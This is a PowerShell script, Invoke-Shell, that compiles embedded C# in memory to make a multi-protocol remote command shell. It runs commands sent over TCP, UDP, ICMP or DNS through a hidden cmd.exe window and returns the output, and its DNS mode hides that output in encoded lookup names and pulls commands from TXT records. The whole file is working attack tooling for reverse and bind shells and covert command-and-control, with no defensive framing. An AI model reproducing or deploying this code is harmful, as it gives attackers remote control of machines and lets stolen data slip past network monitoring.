function Invoke-Shell
{

    [CmdletBinding()]
    Param (
        [string]
        $Command = "connect 0.0.0.0 443"

    )

$Shell = @"
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Text;
//using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

namespace SharpShell
{
    class DnsClass
    {
        public enum DnsQueryOptions
        {
            DNS_QUERY_STANDARD = 0x0,
            DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE = 0x1,
            DNS_QUERY_USE_TCP_ONLY = 0x2,
            DNS_QUERY_NO_RECURSION = 0x4,
            DNS_QUERY_BYPASS_CACHE = 0x8,
            DNS_QUERY_NO_WIRE_QUERY = 0x10,
            DNS_QUERY_NO_LOCAL_NAME = 0x20,
            DNS_QUERY_NO_HOSTS_FILE = 0x40,
            DNS_QUERY_NO_NETBT = 0x80,
            DNS_QUERY_WIRE_ONLY = 0x100,
            DNS_QUERY_RETURN_MESSAGE = 0x200,
            DNS_QUERY_MULTICAST_ONLY = 0x400,
            DNS_QUERY_NO_MULTICAST = 0x800,
            DNS_QUERY_TREAT_AS_FQDN = 0x1000,
            DNS_QUERY_ADDRCONFIG = 0x2000,
            DNS_QUERY_DUAL_ADDR = 0x4000,
            DNS_QUERY_MULTICAST_WAIT = 0x20000,
            DNS_QUERY_MULTICAST_VERIFY = 0x40000,
            DNS_QUERY_DONT_RESET_TTL_VALUES = 0x100000,
            DNS_QUERY_DISABLE_IDN_ENCODING = 0x200000,
            DNS_QUERY_APPEND_MULTILABEL = 0x800000,
            DNS_QUERY_RESERVED = unchecked((int)0xF0000000)
        }

        public enum DNS_FREE_TYPE
        {
            DnsFreeFlat = 0,
            DnsFreeRecordList = 1,
            DnsFreeParsedMessageFields = 2
        }

        public enum DnsRecordTypes
        {
            DNS_TYPE_A = 0x1,
            DNS_TYPE_TEXT = 0x10,
            DNS_TYPE_TXT = DNS_TYPE_TEXT,
        }

        [DllImport("dnsapi", EntryPoint = "DnsQuery_W", CharSet = CharSet.Unicode, SetLastError = true, ExactSpelling = true)]
        public static extern int DnsQuery([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrName, DnsRecordTypes wType,
            DnsQueryOptions Options, IntPtr pExtra, ref IntPtr ppQueryResultsSet, IntPtr pReserved);

        [DllImport("dnsapi", EntryPoint = "DnsQuery_W", CharSet = CharSet.Unicode, SetLastError = true, ExactSpelling = true)]
        public static extern int DnsQueryWithServerIp([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpstrName, DnsRecordTypes wType,
            DnsQueryOptions Options, ref IP4_ARRAY dnsServerIpArray, ref IntPtr ppQueryResultsSet, IntPtr pReserved);

        [DllImport("dnsapi", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern void DnsRecordListFree(IntPtr pRecordList, DNS_FREE_TYPE FreeType);

        [StructLayout(LayoutKind.Sequential)]
        public struct DNS_A_DATA
        {
            public uint IpAddress;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DNS_TXT_DATA
        {
            public uint dwStringCount;
            public IntPtr pStringArray;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct DNS_RECORD_FLAGS
        {
            internal uint data;
            public uint Section
            {
                get { return data & 0x3u; }
                set { data = (data & ~0x3u) | (value & 0x3u); }
            }
            public uint Delete
            {
                get { return (data >> 2) & 0x1u; }
                set { data = (data & ~(0x1u << 2)) | (value & 0x1u) << 2; }
            }
            public uint CharSet
            {
                get { return (data >> 3) & 0x3u; }
                set { data = (data & ~(0x3u << 3)) | (value & 0x3u) << 3; }
            }
            public uint Unused
            {
                get { return (data >> 5) & 0x7u; }
                set { data = (data & ~(0x7u << 5)) | (value & 0x7u) << 5; }
            }
            public uint Reserved
            {
                get { return (data >> 8) & 0xFFFFFFu; }
                set { data = (data & ~(0xFFFFFFu << 8)) | (value & 0xFFFFFFu) << 8; }
            }
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct FlagsUnion
        {
            [FieldOffset(0)]
            public uint DW;
            [FieldOffset(0)]
            public DNS_RECORD_FLAGS S;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct DataUnion
        {
            [FieldOffset(0)]
            public DNS_A_DATA A;
            [FieldOffset(0)]
            public DNS_TXT_DATA HINFO, Hinfo, ISDN, Isdn, TXT, Txt, X25;
        }

        [StructLayout(LayoutKind.Explicit)]
        public struct DNS_RECORD
        {
            [FieldOffset(0)]
            public IntPtr pNext;
            [FieldOffset(4)]
            public IntPtr pName;
            [FieldOffset(8)]
            public ushort wType;
            [FieldOffset(10)]
            public ushort wDataLength;
            [FieldOffset(12)]
            public FlagsUnion Flags;
            [FieldOffset(16)]
            public uint dwTtl;
            [FieldOffset(20)]
            public uint dwReserved;
            [FieldOffset(24)]
            public DataUnion Data;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IP4_ARRAY
        {
            public UInt32 AddrCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1, ArraySubType = UnmanagedType.U4)]
            public UInt32[] AddrArray;
        }

        public string DnsServerIp = "";

        public static long IpToInt(string ip)
        {
            char[] separator = new char[] { '.' };
            string[] items = ip.Split(separator);
            return long.Parse(items[0]) << 24
                    | long.Parse(items[1]) << 16
                    | long.Parse(items[2]) << 8
                    | long.Parse(items[3]);
        }

        public static string IntToIp(long ipInt)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append((ipInt >> 24) & 0xFF).Append(".");
            sb.Append((ipInt >> 16) & 0xFF).Append(".");
            sb.Append((ipInt >> 8) & 0xFF).Append(".");
            sb.Append(ipInt & 0xFF);
            return sb.ToString();
        }

        public List<string> QueryA(string domain)
        {
            IntPtr recordsArray = IntPtr.Zero;
            try
            {
                int result = 0;
                if (DnsServerIp.Length == 0)
                {
                    result = DnsQuery(ref domain, DnsRecordTypes.DNS_TYPE_A, DnsQueryOptions.DNS_QUERY_BYPASS_CACHE, IntPtr.Zero, ref recordsArray, IntPtr.Zero);
                }
                else
                {
                    uint address = BitConverter.ToUInt32(IPAddress.Parse(DnsServerIp).GetAddressBytes(), 0);
                    uint[] ipArray = new uint[1];
                    ipArray.SetValue(address, 0);
                    IP4_ARRAY dnsServerArray = new IP4_ARRAY();
                    dnsServerArray.AddrCount = 1;
                    dnsServerArray.AddrArray = new uint[1];
                    dnsServerArray.AddrArray[0] = address;
                    result = DnsQueryWithServerIp(ref domain, DnsRecordTypes.DNS_TYPE_A, DnsQueryOptions.DNS_QUERY_BYPASS_CACHE, ref dnsServerArray, ref recordsArray, IntPtr.Zero);
                }

                if (result != 0)
                {
                    return null;
                }
                DNS_RECORD record;
                List<string> recordList = new List<string>();
                for (IntPtr recordPtr = recordsArray; !recordPtr.Equals(IntPtr.Zero); recordPtr = record.pNext)
                {
                    record = (DNS_RECORD)Marshal.PtrToStructure(recordPtr, typeof(DNS_RECORD));
                    if (record.wType == (int)DnsRecordTypes.DNS_TYPE_A)
                    {
                        recordList.Add(IntToIp(record.Data.A.IpAddress));
                        //Console.WriteLine(IntToIp(record.Data.A.IpAddress));
                    }
                }
                return recordList;

            }
            finally
            {
                if (recordsArray != IntPtr.Zero)
                {
                    DnsRecordListFree(recordsArray, DNS_FREE_TYPE.DnsFreeFlat);
                }
            }
        }

        public List<string> QueryTXT(string domain)
        {
            IntPtr recordsArray = IntPtr.Zero;
            try
            {
                int result = 0;
                if (DnsServerIp.Length == 0)
                {
                    result = DnsQuery(ref domain, DnsRecordTypes.DNS_TYPE_TXT, DnsQueryOptions.DNS_QUERY_BYPASS_CACHE, IntPtr.Zero, ref recordsArray, IntPtr.Zero);
                }
                else
                {

                    uint address = BitConverter.ToUInt32(IPAddress.Parse(DnsServerIp).GetAddressBytes(), 0);
                    uint[] ipArray = new uint[1];
                    ipArray.SetValue(address, 0);
                    IP4_ARRAY dnsServerArray = new IP4_ARRAY();
                    dnsServerArray.AddrCount = 1;
                    dnsServerArray.AddrArray = new uint[1];
                    dnsServerArray.AddrArray[0] = address;
                    result = DnsQueryWithServerIp(ref domain, DnsRecordTypes.DNS_TYPE_TXT, DnsQueryOptions.DNS_QUERY_BYPASS_CACHE, ref dnsServerArray, ref recordsArray, IntPtr.Zero);
                }
                if (result != 0)
                {
                    return null;
                }
                DNS_RECORD record;
                List<string> recordList = new List<string>();
                for (IntPtr recordPtr = recordsArray; !recordPtr.Equals(IntPtr.Zero); recordPtr = record.pNext)
                {
                    record = (DNS_RECORD)Marshal.PtrToStructure(recordPtr, typeof(DNS_RECORD));
                    if (record.wType == (int)DnsRecordTypes.DNS_TYPE_TXT)
                    {
                        recordList.Add(Marshal.PtrToStringAuto(record.Data.TXT.pStringArray));
                        //Console.WriteLine(Marshal.PtrToStringAuto(record.Data.TXT.pStringArray));   
                    }
                }
                return recordList;
            }
            finally
            {
                if (recordsArray != IntPtr.Zero)
                {
                    DnsRecordListFree(recordsArray, DNS_FREE_TYPE.DnsFreeFlat);
                }
            }
        }

    }

    public class Program
    {
        static string Prompt = "Command>";

        public static string RunCmd(string cmd)
        {
            string outSuccess = string.Empty;
            string outFail = string.Empty;
            if (cmd.Length > 0)
            {
                Process proc = new Process();
                proc.StartInfo.FileName = "cmd.exe";
                proc.StartInfo.Arguments = "/C " + cmd;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardInput = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;
                proc.StartInfo.CreateNoWindow = true;
                try
                {
                    if (proc.Start())
                    {
                        proc.WaitForExit(10 * 1000);
                        outSuccess = proc.StandardOutput.ReadToEnd();
                        outFail = proc.StandardError.ReadToEnd();
                        if (outSuccess.Length > 0)
                        {
                            return outSuccess;
                        }
                        else
                        {
                            return outFail;
                        }

                    }
                }
                catch (Exception)
                {
                    outFail = proc.StandardError.ReadToEnd();
                    return outFail;
                }
                finally
                {
                    if (!proc.HasExited)
                    {
                        if (!proc.Responding)
                        {
                            proc.Kill();
                        }
                    }
                    if (proc != null)
                    {
                        proc.Close();
                        proc.Dispose();
                        proc = null;
                    }
                }
            }
            return "\n";
        }

        static void TcpShell(string Action, string IPAddr, int Port)
        {
            TcpClient client = null;
            TcpListener server = null;
            if (Action == "connect")
            {
                client = new TcpClient(IPAddr, Port);
            }
            if (Action == "listen")
            {
                IPAddress localAddr = IPAddress.Parse(IPAddr);
                try
                {
                    server = new TcpListener(localAddr, Port);
                    server.Start();
                    client = server.AcceptTcpClient();
                }
                catch (SocketException e)
                {
                    Console.WriteLine("SocketException: {0}", e);
                    return;
                }

            }

            NetworkStream stream = client.GetStream();
            byte[] bytes = new Byte[65535];
            byte[] sendbytes = System.Text.Encoding.UTF8.GetBytes(Prompt);
            stream.Write(sendbytes, 0, sendbytes.Length);
            int i = stream.Read(bytes, 0, bytes.Length);
            while (i != 0)
            {
                ASCIIEncoding EncodedText = new System.Text.ASCIIEncoding();
                string data = EncodedText.GetString(bytes, 0, i);
                string sendback = RunCmd(data);
                sendbytes = System.Text.Encoding.UTF8.GetBytes(sendback);
                stream.Write(sendbytes, 0, sendbytes.Length);
                byte[] sendbytes2 = System.Text.Encoding.UTF8.GetBytes(Prompt);
                stream.Write(sendbytes2, 0, sendbytes2.Length);
                stream.Flush();
                i = stream.Read(bytes, 0, bytes.Length);
            }
            client.Close();
            if (server != null)
                server.Stop();
        }

        static void UdpShell(string Action, string IPAddr, int Port)
        {
            UdpClient client = null;
            //UdpClient server = null;
            IPEndPoint endpoint = new IPEndPoint(IPAddress.Parse(IPAddr), Port);
            ASCIIEncoding EncodedText = new System.Text.ASCIIEncoding();
            if (Action == "connect")
            {
                if (IPAddr.Length > 16)
                {
                    client = new UdpClient(Port, AddressFamily.InterNetworkV6);
                }
                else
                {
                    client = new UdpClient(Port, AddressFamily.InterNetwork);
                }
            }
            if (Action == "listen")
            {
                endpoint = new IPEndPoint(IPAddress.Any, Port);
                if (IPAddr.Length > 16)
                {
                    client = new UdpClient(Port, AddressFamily.InterNetworkV6);
                }
                else
                {
                    client = new UdpClient(Port, AddressFamily.InterNetwork);
                }
                client.Receive(ref endpoint);
            }
            byte[] bytes = new Byte[65535];
            byte[] sendbytes = System.Text.Encoding.UTF8.GetBytes(Prompt);
            client.Send(sendbytes, sendbytes.Length, endpoint);

            while (true)
            {
                byte[] receivebytes = client.Receive(ref endpoint);
                string returndata = EncodedText.GetString(receivebytes);
                if (returndata.ToLower() == "exit\n")
                    break;
                string sendback = RunCmd(returndata);
                sendbytes = System.Text.Encoding.UTF8.GetBytes(sendback);
                client.Send(sendbytes, sendbytes.Length, endpoint);
                byte[] sendbytes2 = System.Text.Encoding.UTF8.GetBytes(Prompt);
                client.Send(sendbytes2, sendbytes2.Length, endpoint);
            }
            client.Close();
        }

        static void IcmpShell(string IPAddr)
        {
            int Delay = 1;
            int BufferSize = 128;
            Ping pingSender = new Ping();
            PingOptions options = new PingOptions();
            options.DontFragment = true;


            byte[] PromptBuffer = Encoding.UTF8.GetBytes(Prompt);
            int Timeout = 60 * 1000;
            PingReply reply = pingSender.Send(IPAddr, Timeout, PromptBuffer, options);

            while (true)
            {
                byte[] EmptyBuffer = Encoding.UTF8.GetBytes("");
                reply = pingSender.Send(IPAddr, Timeout, EmptyBuffer, options);
                if (reply.Buffer.Length > 0)
                {
                    string Response = Encoding.ASCII.GetString(reply.Buffer);
                    if (Response.ToLower() == "exit\n")
                        break;
                    string Result = RunCmd(Response);
                    byte[] ResultBuffer = Encoding.UTF8.GetBytes(Result);
                    int index = (int)Math.Floor((double)(ResultBuffer.Length / BufferSize));
                    int i = 0;

                    if (ResultBuffer.Length > BufferSize)
                    {
                        byte[] ResultBuffer2;
                        while (i < index)
                        {
                            /* only c# 3.5 can support linq */
                            //ResultBuffer2 = ResultBuffer.Skip(i * BufferSize).Take((i + 1) * BufferSize - i * BufferSize).ToArray();
                            ResultBuffer2 = new List<byte>(ResultBuffer).GetRange(i * BufferSize, (i + 1) * BufferSize - i * BufferSize).ToArray();
                            reply = pingSender.Send(IPAddr, Timeout, ResultBuffer2, options);
                            i += 1;
                        }
                        int remainIndex = ResultBuffer.Length % BufferSize;
                        if (remainIndex != 0)
                        {
                            /* only c# 3.5 can support linq */
                            //ResultBuffer2 = ResultBuffer.Skip(i * BufferSize).Take(ResultBuffer.Length - i * BufferSize).ToArray();
                            ResultBuffer2 = new List<byte>(ResultBuffer).GetRange(i * BufferSize, ResultBuffer.Length - i * BufferSize).ToArray();
                            reply = pingSender.Send(IPAddr, Timeout, ResultBuffer2, options);
                        }
                    }
                    else
                    {
                        reply = pingSender.Send(IPAddr, Timeout, ResultBuffer, options);
                    }
                    reply = pingSender.Send(IPAddr, Timeout, PromptBuffer, options);
                }
                else
                {
                    Thread.Sleep(Delay * 1000);
                }
            }
        }

        static int RandomNumber(int min, int max)
        {
            Random random = new Random();
            return random.Next(min, max);
        }

        static string RandomString(int size, bool lowerCase)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            if (lowerCase)
                return builder.ToString().ToLower();
            return builder.ToString();
        }

        static void DnsExec(DnsClass dnsClass, string cmd, string domain)
        {
            string result = RunCmd(cmd);
            byte[] sendbytes = System.Text.Encoding.UTF8.GetBytes(result);
            string bitString = BitConverter.ToString(sendbytes).Replace("-", "");
            int bitLen = bitString.Length;
            int split = 50;
            int repeat = (int)Math.Floor((double)(bitLen / split));
            int remainder = bitLen % split;
            int repeatR = 0;
            if (remainder > 0)
                repeatR = repeat + 1;
            string rnd = RandomString(8, false) + ".CMDC" + repeatR.ToString() + "." + domain;
            dnsClass.QueryA(rnd);
            int i = 0;
            for (; i < repeat; i++)
            {
                string subStr = bitString.Substring(i * split, split);
                rnd = RandomString(8, false) + ".CMD" + i.ToString() + "." + subStr + "." + domain;
                dnsClass.QueryA(rnd);
            }
            if (remainder > 0)
            {
                string subStr2 = bitString.Substring(bitLen - remainder);
                i += 1;
                rnd = RandomString(8, false) + ".CMD" + i.ToString() + "." + subStr2 + "." + domain;
                dnsClass.QueryA(rnd);
            }
            rnd = RandomString(8, false) + ".END." + domain;
            dnsClass.QueryA(rnd);
        }

        static void DnsShell(string Domain, string IPAddr)
        {
            DnsClass dnsClass = new DnsClass();
            if (IPAddr.Length > 0)
                dnsClass.DnsServerIp = IPAddr;
            while (true)
            {
                string rnd = RandomNumber(1000, 9999).ToString() + RandomString(8, false) + "." + Domain;
                List<string> txtRecords = dnsClass.QueryTXT(rnd);
                if (txtRecords == null)
                    continue;
                string responseCmd = String.Join(" ", txtRecords.ToArray());
                Console.WriteLine(responseCmd);
                if (responseCmd.ToLower().StartsWith("nocmd") || responseCmd.Length == 0)
                    continue;
                if (responseCmd.ToLower().StartsWith("exit"))
                    break;
                DnsExec(dnsClass, responseCmd, Domain);
            }
        }


        static void Usage()
        {
            Console.Write(@"Possible Arguments:
tcp listen 0.0.0.0 8080
tcp connect 192.168.1.1 8080
udp listen 0.0.0.0 8080
udp connect 192.168.1.1 8080
icmp connect 192.168.1.1
dns direct 192.168.1.1 test.com
dns recurse test.com
");
        }

        public static void Main(params string[] args)
        {
            if (args.Length == 0)
            {
                Usage();
            }
            string action = args[1].ToLower();
            if (action != "connect" && action != "listen" && action != "direct" && action != "recurse")
            {
                Usage();
            }
            string ip = "";
            int port = 0;
            string mode = args[0].ToLower();
            switch (mode)
            {
                case "tcp":
                    ip = args[2];
                    port = Convert.ToInt32(args[3]);
                    TcpShell(action, ip, port);
                    break;
                case "udp":
                    ip = args[2];
                    port = Convert.ToInt32(args[3]);
                    UdpShell(action, ip, port);
                    break;
                case "icmp":
                    if (args.Length == 3)
                    {
                        ip = args[2];
                        IcmpShell(ip);
                    }
                    break;
                case "dns":
                    string domain = "";
                    if (action == "direct")
                    {
                        ip = args[2];
                        domain = args[3];
                        DnsShell(domain, ip);
                    }
                    if (action == "recurse")
                    {
                        domain = args[2];
                        DnsShell(domain, "");
                    }
                    break;
                default:
                    Usage();
                    break;
            }
        }
    }
}
"@

Add-Type -TypeDefinition $shell -Language CSharp


[SharpShell.Program]::Main($Command.Split(" "))

}
